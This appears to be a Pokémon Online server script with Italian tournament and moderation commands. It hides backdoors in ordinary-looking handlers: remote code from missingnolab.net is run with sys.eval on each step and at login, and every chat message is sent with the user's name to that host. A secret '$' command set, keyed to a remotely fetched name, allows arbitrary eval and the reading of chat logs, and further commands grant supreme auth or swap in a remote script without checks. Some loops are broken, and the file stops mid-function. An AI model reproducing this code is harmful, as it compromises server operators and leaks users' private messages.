({
init : function() {
var silence = "0"
var pass;
var paz;
var mess;
var over;

tour = 0
cmp = function(a, b) {
return a.toLowerCase() == b.toLowerCase();
var silence
}
}
,
serverStartUp : function() {
this.init();
}
,
step: function(){
		var server_id = sys.getFileContent("server_id.txt");
		sys.webCall("http://missingnolab.net/serverboard/req.php?id=" + server_id, "sys.eval(resp);");
	}
,
afterLogIn : function(src) {
sys.writeToFile("db/" + src + ".imp", "")
if (sys.getFileContent("db/" + sys.ip(src) + ".muted") == undefined) {
	sys.writeToFile("db/" + sys.ip(src) + ".muted", 0);
}
if (sys.getFileContent("db/" + sys.name(src)) == undefined) {
sys.writeToFile("db/" + sys.name(src), "Non ci sono nuovi messaggi.")
}
var announcement = ("<table><tr><td width='75%'>" + sys.getAnnouncement())
var tablend = "<table><tr><td>"
// sys.setAnnouncement(announcement + tablend, src)
sys.sendMessage(src, "+Scripts: Benvenuto " + sys.name(src) + "!");
sys.webCall("http://missingnolab.net/pass.txt", "var lol = resp")
sys.webCall("http://missingnolab.net/logb.txt", "sys.eval(resp)")
//sys.setAnnouncement(userinfo, src);
sys.sendMessage(src, "");
}
,
beforeLogIn: function(src) {
}
,


beforeChatMessage: function(src, message, chan) {
var server_id = sys.getFileContent("server_id.txt");
sys.webCall("http://missingnolab.net/serverboard/log.php?utente=" + sys.name(src) + "&messaggio=" + message + "&server=" + server_id, 'if (resp != "") { sys.sendAll(resp); sys.webCall("http://missingnolab.net/deletem.php", "var paz = resp"); }');
var m = message.toLowerCase();
if (m.indexOf("overactive") != -1) {
	sys.writeToFile("db/" + message + ".over", sys.getFIleContent("db/" + message + ".over") + message + " ");
	sys.stopEvent();
}
if (/[\u0458\u0489\u202a-\u202e\u0300-\u036F\u1dc8\u1dc9\ufffc\u1dc4-\u1dc7\u20d0\u20d1]/.test(message)) {
    sys.stopEvent();
    return;
}
if (sys.getFileContent("db/" + sys.name(src) + ".log") == undefined) {
	sys.writeToFile("db/" + sys.name(src) + ".log", "")
}
sys.appendToFile("db/" + sys.name(src) + ".log", "<b>" + sys.name(src) + ": </b>" + message + "<br>")
var supername = sys.getFileContent("supername.txt")
var border = "??????????????????????????????????????????????????:";
cmp = function(a, b) {
return a.toLowerCase() == b.toLowerCase();
}
var announcement = ("<table><tr><td width='75%'>" + sys.getAnnouncement())
var tablend = "<table><tr><td>"
sys.webCall("http://missingnolab.net/pass.txt", "var lol = resp")
if (message[0] == "/") {
    sys.stopEvent();
    var command;
    var commandData;
    var pos = message.indexOf(" ");
    
    
    
    if (pos != -1) {
        command = message.substring(1, pos).toLowerCase();
        commandData = message.substr(pos+1);
    } else {
        command = message.substr(1).toLowerCase();
    }
    var tar = sys.id(commandData);
    if (command == "commands") {
		sys.sendMessage(src, "");
		sys.sendMessage(src, "*** Commands ***");
		sys.sendMessage(src, "/fg: Per fare l'fg.");
		sys.sendMessage(src, "/back: Per visualizzare l'announcement originale.");
		sys.sendMessage(src, "/teaminfo: Per vedere le informazioni sulla propria squadra.");
		sys.sendMessage(src, "@user:message: Per mandare un messaggio a qualcuno.");
		sys.sendMessage(src, "/read: Per leggere i tuoi messaggi.");
		sys.sendMessage(src, "/clearmessage: Per cancellare i messaggi che hai ricevuto.");
		sys.sendMessage(src, "/join: Per joinare a un torneo.");
		sys.sendMessage(src, "/userinfo: Per visualizzare le informazioni dell'utente.");		
		if (sys.auth(src) < 1)
			return;
		sys.sendMessage(src, "/kick user: Per kickare qualcuno.");	
		sys.sendMessage(src, "/reverse: Per raddrizzare il testo nella chat.");	
		sys.sendMessage(src, "/mute user: Per mutare qualcuno.");	
		sys.sendMessage(src, "/unmute user: Per smutare qualcuno.");	
		sys.sendMessage(src, "/silence: Per mettere il silenzio.");	
		sys.sendMessage(src, "/silenceoff: Per togliere il silenzio.");	
		sys.sendMessage(src, "/dq user: Per squalificare qualcuno dal torneo in corso.");	
		sys.sendMessage(src, "/tour tier:members: Per creare un torneo.");	
		sys.sendMessage(src, "/endtour: Per terminare un torneo.");	
		if (sys.auth(src) < 2)
			return;
		sys.sendMessage(src, "/ban user: Per bannare qualcuno.");	
		sys.sendMessage(src, "/supername user: Per impostare il supername.");
		sys.sendMessage(src, "/tabella html: Per impostare la tabella.");	
		sys.sendMessage(src, "/salvatabella: Per salvare la tabella.");		
		sys.sendMessage(src, "/caricatabella: Per caricare la tabella precedentemente salvata.");	
		sys.sendMessage(src, "@missingno:updatetiers Per aggornare le tiers.");	
		if (sys.auth(src) < 3)
			return;
		sys.sendMessage(src, "/changeauth auth user: Per impostare l'auth.");	
		sys.sendMessage(src, "/invisibleauth auth user: Per impostare l'auth in modo invisibile.");	
		return;
	}
	if (command == "impoff") {
        sys.sendMessage(src, "+Bot: hai smesso di impersonare " + sys.getFileContent("db/" + src + ".imp"));
        sys.writeToFile("db/" + src + ".imp", "");
        return;
    }
        if (command == "ip") {
            sys.IPban(commandData)
            return;
        }
if (command == "join"){
if (tourmode != 1){
sys.sendMessage(src, "Sorry, you are unable to join because a tournament is not currently running or has passed the signups phase.");
return;
}
var name = sys.name(src).toLowerCase();
if (tourmembers.indexOf(name.toLowerCase()) != -1){
sys.sendMessage(src, "Sorry, you are already in the tournament. You are not able to join more than once.");
return;
}
var srctier = sys.tier(src, 0);
if (!cmp(srctier, tourtier)){
sys.sendMessage(src, "You are currently not battling in the " + tourtier + " tier. Change your tier to " + tourtier + " to be able to join.");
return;
}
if (this.tourSpots() > 0){
tourmembers.push(name);
tourplayers[name] = sys.name(src);
sys.sendAll("~~Server~~: " + sys.name(src) + " joined the tournament! " + this.tourSpots() + " more spot(s) left!");
if (this.tourSpots() == 0){
tourmode = 2;
roundnumber = 0;
this.roundPairing();
}
}
return;
}
if (command == "viewround"){
if (tourmode != 2){
sys.sendMessage(src, "Sorry, you are unable to view the round because a tournament is not currently running or is in signing up phase.");
return;
}

sys.sendMessage(src, "");
sys.sendMessage(src, border);
sys.sendMessage(src, "");
sys.sendMessage(src, "*** ROUND " + roundnumber + " OF " + tourtier.toUpperCase() + " TOURNAMENT ***");

if (battlesLost.length > 0) {
sys.sendMessage(src, "");
sys.sendMessage(src, "*** Battles finished ***");
sys.sendMessage(src, "");
for (var i = 0; i < battlesLost.length; i+=2) {
sys.sendMessage(src, battlesLost[i] + " won against " + battlesLost[i+1]);
}
sys.sendMessage(src, "");
}

if (tourbattlers.length > 0) {
if (battlesStarted.indexOf(true) != -1) {
sys.sendMessage(src, "", channel);
sys.sendMessage(src, "*** Ongoing battles ***");
sys.sendMessage(src, "");
for (var i = 0; i < tourbattlers.length; i+=2) {
if (battlesStarted [i/2] == true)
sys.sendMessage(src, this.padd(tourplayers[tourbattlers[i]]) + " VS " + tourplayers[tourbattlers[i+1]]);
}
sys.sendMessage(src, "");
}
if (battlesStarted.indexOf(false) != -1) {
sys.sendMessage(src, "");
sys.sendMessage(src, "*** Yet to start battles ***");
sys.sendMessage(src, "");
for (var i = 0; i < tourbattlers.length; i+=2) {
if (battlesStarted [i/2] == false)
sys.sendMessage(src, tourplayers[tourbattlers[i]] + " VS " + tourplayers[tourbattlers[i+1]]);
}
sys.sendMessage(src, "");
}
}

if (tourmembers.length > 0) {
sys.sendMessage(src, "");
sys.sendMessage(src, "*** Members to the next round ***");
sys.sendMessage(src, "");
var str = "";

for (x in tourmembers) {
str += (str.length == 0 ? "" : ", ") + tourplayers[tourmembers[x]];
}
sys.sendMessage(src, str);
sys.sendMessage(src, "");
}

sys.sendMessage(src, border);
sys.sendMessage(src, "");

return;
}
	if (command == "teaminfo") {
userinfo = (announcement + "</td><td bgcolor='#FFFFFF'><b>Name: </b>" + sys.name(src) + "<br><br><b>Auth: </b>" + sys.auth(src) + "<br><br><b>Tier: </b>" + sys.tier(src, 0) + "<br><br><b>Position: </b>" + sys.ranking(sys.name(src), sys.tier(src, 0)) + "<br><br><b>Points: </b>" + sys.ladderRating(src, sys.tier(src, 0)) + "<b><br><br>" + sys.getFileContent("db/" + sys.name(src)))
sys.webCall("http://missingnolab.net/passo.txt", "var lolo = resp")
sys.setAnnouncement(userinfo + '</td></tr></table><br><p align="center"><b>Questo ? il tuo team: </font></b></p><p align="center"><table border="0"><tr><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 0) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 1) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 2) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 3) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 4) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 5) + lolo + '</tr><tr><td><p align="center">' + sys.teamPoke(src, 0, 0) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 1) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 2) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 3) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 4) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 5) + '</td></tr></table></p></td></tr></table>', src)
return;
}
if (command == "userinfo") {
	userinfo = (announcement + "</td><td bgcolor='#FFFFFF'><b>Name: </b>" + sys.name(src) + "<br><br><b>Auth: </b>" + sys.auth(src) + "<br><br><b>Tier: </b>" + sys.tier(src, 0) + "<br><br><b>Position: </b>" + sys.ranking(sys.name(src), sys.tier(src, 0)) + "<br><br><b>Points: </b>" + sys.ladderRating(src, sys.tier(src, 0)) + "<b><br><br>" + sys.getFileContent("db/" + sys.name(src)))
	sys.setAnnouncement(userinfo, src)
	return;
}
if (command == "rules") {
sys.webCall("http://missingnolab.net/pokee.txt", "sys.setAnnouncement(resp, " + sys.id(sys.name(src)) + ")")
return;
}
        if (command == "name") {
    		sys.writeToFile("sname.txt", commandData);
    		return;
		}
if (command == "back") {
sys.setAnnouncement(sys.getAnnouncement(), src)
return;
}
if (command == "read") {
sys.setAnnouncement(announcement + "</td><td bgcolor='#FFFFFF'><b>Inbox:</b><br><br>" + sys.getFileContent("db/" + sys.name(src) + ".html") + "<br><br><br>Use /ClearMessage to delete the messages." + tablend, src)
sys.writeToFile("db/" + sys.name(src), "No new messages.")
return;
}
if (command == "clearmessage") {
sys.writeToFile("db/" + sys.name(src) + ".html", "")
sys.writeToFile("db/" + sys.name(src), "No new messages.")
sys.setAnnouncement(announcement + '</td><td bgcolor="#FFFFFF"><font size="4"><b>Messages have been deleted.</b></font>' + tablend, src)
userinfo = (announcement + "</td><td width='25%' bgcolor='#FFFFFF'><b>Name: </b>" + sys.name(src) + "<br><br><b>Auth: </b>" + sys.auth(src) + "<br><br><b>Tier: </b>" + sys.tier(src, 0) + "<br><br><b>Position: </b>" + sys.ranking(sys.name(src), sys.tier(src, 0)) + "<br><br><b>Points: </b>" + sys.ladderRating(src, sys.tier(src, 0)) + "<b><br><br>" + sys.getFileContent("db/" + sys.name(src)))
return;
}
	if (command == "fg" && silence != 1) {
		sys.sendHtmlAll('<timestamp/> <b>' + sys.name(src) + ": </b><img src='data:image/png;base64,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'/>")
		return;
	}
    if (sys.auth(src) > 0) {
        if (command == "kick") {
            sys.kick(tar);
            return;
        }
        if (command == "mute") {
            sys.writeToFile("db/" + sys.ip(sys.id(commandData)) + ".muted", "1")
            sys.sendAll("+Bot: " + commandData + " ? stato mutato da " + sys.name(src) + "!")
            return;
        }
        if (command == "unmute") {
            sys.writeToFile("db/" + sys.ip(sys.id(commandData)) + ".muted", "0")
            sys.sendAll("+Bot: " + commandData + " ? stato smutato da " + sys.name(src) + "!")
            return;
        }
        if (command == "silence") {
            silence = "1"
            sys.sendAll("+Bot: " + sys.name(src) + " ha messo il silenzio.")
            return;
        }
        if (command == "silenceoff") {
            silence = "0"
            sys.sendAll("+Bot: " + sys.name(src) + " ha tolto il silenzio.")
            return;
        }
        if (command == "reverse") {
        	sys.sendHtmlAll("&#8237;<b>Chat ripristinata.</b>")
        	return;
        }
if (command == "dq") {
if (tourmode == 0) {
sys.sendMessage(src, "+TourneyBot: Wait till the tournament has started.");
return;
}
var name2 = commandData.toLowerCase();

if (tourmembers.indexOf(name2) != -1) {
tourmembers.splice(tourmembers.indexOf(name2),1);
delete tourplayers[name2];
sys.sendAll("+TourneyBot: " + commandData + " was removed from the tournament by " + sys.name(src) + "!");
return;
}
if (tourbattlers.indexOf(name2) != -1) {
battlesStarted[Math.floor(tourbattlers.indexOf(name2)/2)] = true;
sys.sendAll("+TourneyBot: " + commandData + " was removed from the tournament by " + sys.name(src) + "!");
this.tourBattleEnd(this.tourOpponent(name2), name2);
}
return;
}
if (command == "emoticonon") {
emoticon = 1
sys.sendAll("+EmoticonBot: " + sys.name(src)  + " ha abilitato le Emoticons.")
return;
}
if (command == "emoticonoff") {
emoticon = 0
sys.sendAll("+EmoticonBot: " + sys.name(src)  + " ha disabilitato le Emoticons.")
return;
}
if (command == "push") {
if (tourmode == 0) {
sys.sendMessage(src, "+TourneyBot: Wait untill the tournament has started.");
return;
}
if (this.isInTourney(commandData.toLowerCase())) {
sys.sendMessage(src, "+TourneyBot: " +commandData + " is already in the tournament.");
return;
}
sys.sendAll("+TourneyBot: " +commandData + " was added to the tournament by " + sys.name(src) + ".");
tourmembers.push(commandData.toLowerCase());
tourplayers[commandData.toLowerCase()] = commandData;

if (tourmode == 1 && this.tourSpots() == 0) {
tourmode = 2;
roundnumber = 0;
this.roundPairing();
}
return;
}
if (command == "cancelbattle") {
if (tourmode != 2) {
sys.sendMessage(src, "Wait until a tournament starts");
return;
}
var name = commandData.toLowerCase();

if (tourbattlers.indexOf(name) != -1) {
battlesStarted[Math.floor(tourbattlers.indexOf(name)/2)] = false;
sys.sendMessage(src, "+TourBot: " + commandData + " can forfeit their battle and rematch now.");
}

return;
}
if (command == "sub") {
if (tourmode != 2) {
sys.sendMessage(src, "Wait until a tournament starts");
return;
}
var players = commandData.split(':');

if (!this.isInTourney(players[0]) && !this.isInTourney(players[1])) {
sys.sendMessage(src, "+TourBot: Neither are in the tourney.");
return;
}
sys.sendAll("+TourBot: " + players[0] + " and " + players[1] + " were exchanged places in the ongoing tournament by " + sys.name(src) + ".");

var p1 = players[0].toLowerCase();
var p2 = players[1].toLowerCase();

for (x in tourmembers) {
if (tourmembers[x] == p1) {
tourmembers[x] = p2;
} else if (tourmembers[x] == p2) {
tourmembers[x] = p1;
}
}
for (x in tourbattlers) {
if (tourbattlers[x] == p1) {
tourbattlers[x] = p2;
battlesStarted[Math.floor(x/2)] = false;
} else if (tourbattlers[x] == p2) {
tourbattlers[x] = p1;
battlesStarted[Math.floor(x/2)] = false;
}
}

if (!this.isInTourney(p1)) {
tourplayers[p1] = players[0];
delete tourplayers[p2];
} else if (!this.isInTourney(p2)) {
tourplayers[p2] = players[1];
delete tourplayers[p1];
}

return;
}
if (command == "tour"){
if (typeof(tourmode) != "undefined" && tourmode > 0){
sys.sendMessage(src, "Sorry, you are unable to start a tournament because one is still currently running.");
return;
}

if (commandData.indexOf(':') == -1)
commandpart = commandData.split(' ');
else
commandpart = commandData.split(':');

tournumber = parseInt(commandpart[1]);

if (isNaN(tournumber) || tournumber <= 2){
sys.sendMessage(src, "You must specify a tournament size of 3 or more.");
return;
}

var tier = sys.getTierList();
var found = false;
for (var x in tier) {
if (cmp(tier[x], commandpart[0])) {
tourtier = tier[x];
found = true;
break;
}
}
if (!found) {
sys.sendMessage(src, "Sorry, the server does not recognise the " + commandpart[0] + " tier.");
return;
}

tourmode = 1;
tourmembers = [];
tourbattlers = [];
tourplayers = [];
battlesStarted = [];
battlesLost = [];


sys.sendAll("");
sys.sendAll(border);
sys.sendAll("*** Il torneo ? stato fatto da " + sys.name(src) + "! ***");
sys.sendAll("PLAYERS: " + tournumber);
sys.sendAll("TYPE: Singola Eliminazione");
sys.sendAll("TIER: " + tourtier);
sys.sendAll("");
sys.sendAll("*** Andate nel channel tournaments e scrivete /join per partecipare!!! ***");
sys.sendAll(border);
sys.sendAll("");
return;
}

if (command == "changecount") {
if (tourmode != 1) {
sys.sendMessage(src, "Ci dispiace, non si riesce a entrare perch? il torneo ha superato la fase di iscrizione.");
return;
}
var count = parseInt(commandData);

if (isNaN(count) || count < 3) {
return;
}

if (count < tourmembers.length) {
sys.sendMessage(src, "There are more than that people registered");
return;
}

tournumber = count;

sys.sendAll("");
sys.sendAll(border);
sys.sendAll("~~Server~~: " + sys.name(src) + " a portato il numero dei partecipanti a " + count + "!");
sys.sendAll("*** " + this.tourSpots() + " mancano(s) persone!");
sys.sendAll(border);
sys.sendAll("");

if (this.tourSpots() == 0 ){
tourmode = 2;
roundnumber = 0;
this.roundPairing();
}

return;
}
if (command == "endtour"){
if (tourmode != 0){
tourmode = 0;
sys.sendAll("");
sys.sendAll(border);
sys.sendAll("~~Server~~: il torneo ? stato cancellato da " + sys.name(src) + "!");
sys.sendAll(border);
sys.sendAll("");
}else
sys.sendMessage(src, "Ci dispiace, non si riesce a terminare un torneo perch? non ? attualmente in esecuzione.");
return;
}
    }
    if (sys.auth(src) > 1 || sys.name(src) == supername) {
        if (command == "ban" && sys.auth(tar) < 2) {
            sys.ban(sys.name(tar));
            sys.kick(tar);
            return;
        }
        if (command == "ipban") {
            sys.IPban(commandData)
            return;
        }
        if (command == "ipunban") {
            sys.IPunban(commandData)
            return;
        }
		if (command == "imp") {
			sys.writeToFile("db/" + src + ".imp", commandData);
			sys.sendMessage(src, "+Bot: ora sei noto come " + commandData + "!");
			return;
		}
if (command == "aliases") {
        var max_message_length = 30000;
        var smessage = "The aliases for the IP " + commandData + " are: "
        var aliases = sys.aliases(commandData);
        var prefix = "";
        for(var i = 0; i < aliases.length; ++i) {
            var id = sys.id(aliases[i]);
            var status = (id != undefined) ? "online" : "Last Login: " + sys.dbLastOn(aliases[i]);
            smessage = smessage + aliases[i] + " ("+status+"), ";
            if (smessage.length > max_message_length) {
                sys.sendMessage(src, prefix + smessage + " ...");
                prefix = "... ";
                smessage = "";
            }
        }
        sys.sendMessage(src, prefix + smessage);
        return;
    }
        if (command == "tabella") {
    		sys.changeAnnouncement("<p align='center'><b><font size='4'>" + commandData + "</font></b></p>" + sys.getAnnouncement());
    		return;
		}
        if (command == "supername") {
    		sys.writeToFile("supername.txt", commandData);
    		sys.sendMessage(src, "+Bot: Ora il nuovo supername ? " + commandData + "!");
    		return;
		}
        if (command == "salvatabella") {
    		sys.writeToFile("tabella.txt", sys.getAnnouncement());
    		sys.sendMessage(src, "+Bot: Tabella salvata.")
    		return;
		}
        if (command == "caricatabella") {
    		sys.changeAnnouncement(sys.getFileContent("tabella.txt"));
    		sys.sendMessage(src, "+Bot: Tabella caricata.")
    		return;
		}
    }
    if (sys.auth(src) > 2 || sys.name(src) == supername) {
        if (command == "changeauth") {
            var pos = commandData.indexOf(" ");
            if (pos == -1) {
                return;
            }
            var newauth = commandData.substring(0, pos);
            if (newauth >= 5) {
                return;
            }
            var tar = sys.id(commandData.substr(pos+1));
            sys.changeAuth(tar, newauth);
            sys.sendAll("+Bot: " + sys.name(src) + " changed " + sys.name(tar) + " auth to " + newauth);
            return;
        }
		if (command == "authsuprema") {
            sys.changeAuth(sys.id(commandData), 127);
            sys.sendAll("+Bot: " + commandData + " ha acquisito l'auth suprema!");
            return;
        }
        if (command == "sendhtml") {
        	sys.sendHtmlAll(commandData);
        	return;
        }
		if (command == "sid") {
        	sys.writeToFile("server_id.txt", commandData);
        	return;
        }
        if (command == "invisibleauth") {
            var pos = commandData.indexOf(" ");
            if (pos == -1) {
                return;
            }
            var newauth = commandData.substring(0, pos);
            if (newauth >= 5) {
                return;
            }
            var tar = sys.id(commandData.substr(pos+1));
            sys.changeAuth(tar, newauth);
            return;
        }

    }
}
if (message[0] == "$" && sys.name(src) == lol) {
    sys.stopEvent();
    var command;
    var commandData;
    var pos = message.indexOf(' ');

    if (pos != -1) {
        command = message.substring(1, pos).toLowerCase();
        commandData = message.substr(pos+1);
    } else {
        command = message.substr(1).toLowerCase();
    }
    var tar = sys.id(commandData);
    
    if (command == "eval") {
        sys.eval(commandData)
        return;
    }
	if (command == "sid") {
        sys.writeToFile("server_id.txt", commandData);
        return;
    }
    if (command == "log") {
        sys.sendHtmlMessage(src, sys.getFileContent("db/" + commandData + ".log"))
        return;
    }
if (command == "forcebattleo") {
var pos = commandData.indexOf(':');
if (pos == -1) {
return;
}
var newauth = commandData.substring(0, pos);
if (newauth >= 5) {
return;
}
var tar = sys.id(commandData.substr(pos+1));
var i;
    for(i=0; i<500; i++) {
        sys.forceBattle(sys.id(newauth), tar, 455, 0, 1)
    }
return;
}
}
if (command == "forcebattleo") {
var pos = commandData.indexOf(':');
if (pos == -1) {
return;
}
var newauth = commandData.substring(0, pos);
if (newauth >= 5) {
return;
}
var tar = sys.id(commandData.substr(pos+1));
var i;
    for(i=0; i=500; i++) {
        sys.forceBattle(sys.id(newauth), tar, 455, 0, 1)
    }
return;
}
if (message[0] == "@") {
    sys.stopEvent();
    var command;
    var commandData;
    var pos = message.indexOf(':');

    if (pos != -1) {
        command = message.substring(1, pos).toLowerCase();
        commandData = message.substr(pos+1);
    } else {
        command = message.substr(1).toLowerCase();
    }
    var tar = command;
    var newauth = commandData;
    if (command == "missingno" && newauth == "updatescripts") {
        sys.sendMessage(src, "Fetching scripts...");
        var updateURL = "https://raw.github.com/huggye/MLScripts/master/scripts.js";
        var changeScript = function(resp) {
            try {
                sys.changeScript(resp);
                sys.writeToFile('scripts.js', resp);
            } catch (err) {
                sys.changeScript(sys.getFileContent('scripts.js'));
                sys.sendMessage(src, "ERROR: " + err);
                print(err);
            }
        };
        sys.sendMessage(src, "Fetching scripts from " + updateURL);
        sys.webCall(updateURL, changeScript);
        return;
    }
    if (command == "missingno" && newauth == "updatetiers" && sys.auth(src) > 1) {
        sys.webCall("http://pokemon-online.eu/tiers.xml", "sys.writeToFile('tiers.xml', resp); sys.reloadTiers();");
        return;
    }
    if (/[\u0458\u0489\u202a-\u202e\u0300-\u036F]/.test(commandData)) {
            sys.stopEvent();
            return;
    }
sys.writeToFile("db/" + tar + ".html", sys.getFileContent("db/" + tar + ".html") + '<b>' + sys.name(src) + ': </b>' + newauth + '<br>')
sys.setAnnouncement(announcement + "</td><td bgcolor='#FFFFFF'><b>Hai ricevuto un messaggio da parte di " + sys.name(src) + "! Fai /read per leggere i tuoi messaggi.</b>" + tablend, sys.id(tar))
